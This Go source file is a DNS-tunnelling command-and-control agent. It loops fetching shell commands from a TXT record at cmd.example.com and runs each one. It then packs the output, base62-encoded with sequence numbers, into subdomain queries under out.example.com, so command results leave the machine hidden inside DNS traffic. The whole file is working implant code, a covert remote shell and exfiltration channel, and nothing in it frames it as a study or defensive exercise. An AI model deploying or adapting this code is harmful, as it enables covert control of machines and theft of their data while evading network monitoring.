package main

import (
	"bytes"
	"context"
	"encoding/binary"
	"fmt"
	"github.com/nicksnyder/basen"
	"log"
	"net"
	"os/exec"
	"strings"
	"time"
)

func main() {
	// Create dns resolver
	r := &net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
			d := net.Dialer{
				Timeout: time.Millisecond * time.Duration(10000),
			}
			return d.DialContext(ctx, "udp", "127.0.0.1:53")
		},
	}
	commandChan := make(chan string)
	responseChan := make(chan *exec.Cmd)
	go getCommand(r, commandChan)
	go handleCommands(commandChan, responseChan)
	returnResponses(r, responseChan)
}

func getCommand(r *net.Resolver, c chan string) {
	for true {
		//get shell command using dns TXT record
		data, err := r.LookupTXT(context.Background(), "cmd.example.com")
		if err != nil {
			log.Fatal(err)
			return
		}
		c <- data[0]
		time.Sleep(2 * time.Second)
	}
}

func handleCommands(commandChan chan string, responseChan chan *exec.Cmd) {
	fmt.Println("waiting for commands...")
	for true {
		response := <-commandChan
		if response != "" {
			fmt.Println("$ " + response)
			command := strings.Split(response, " ")
			responseChan <- execCommand(command)
		}
	}
}

func execCommand(shellCommand []string) *exec.Cmd {
	var cmd *exec.Cmd
	if len(shellCommand) > 1 {
		cmd = exec.Command(shellCommand[0], shellCommand[1])

	} else {
		cmd = exec.Command(shellCommand[0])
	}

	return cmd

}

func returnResponses(r *net.Resolver, c chan *exec.Cmd) {
	var packetNumber uint16 = 0
	for true {
		cmd := <-c
		stdout, err := cmd.Output()

		if err != nil {
			log.Fatal(err)
			return
		}
		requests := encodeDNSRequests(packetNumber, strings.Split(string(stdout), "\n"))
		packetNumber++
		for i, request := range requests {
			fmt.Println(i, " ", request)
			_, err := r.LookupHost(context.Background(), request)
			if err != nil {
				fmt.Println(err)
			}
		}
	}
}

func encodeDNSRequests(packetNumber uint16, cmd []string) []string {
	fmt.Println("cmd result: ", cmd, len(cmd))
	var requests []string
	var b strings.Builder
	for i := 0; i < len(cmd)-1; i++ {
		if i%3 == 0 {
			if i != 0 {
				//we need to create a new request
				b.WriteString("out.example.com")
				requests = append(requests, b.String())
				b.Reset()
			}
			//first level
			buf := new(bytes.Buffer)
			binary.Write(buf, binary.BigEndian, packetNumber)
			bytes := buf.Bytes()
			bytes[0] = bytes[0] & 127
			//update the msb if this is the last request
			if i+3 >= len(cmd)-1 {
				bytes[0] = bytes[0] | 128
			}

			fmt.Printf("% b", bytes)
			fmt.Printf("\n")
			b.WriteString(basen.Base62Encoding.EncodeToString(append(bytes, []byte(cmd[i])...)))
		} else {
			b.WriteString(basen.Base62Encoding.EncodeToString([]byte(cmd[i])))
		}
		b.WriteString(".")
	}
	b.WriteString("out.example.com")
	requests = append(requests, b.String())
	return requests
}
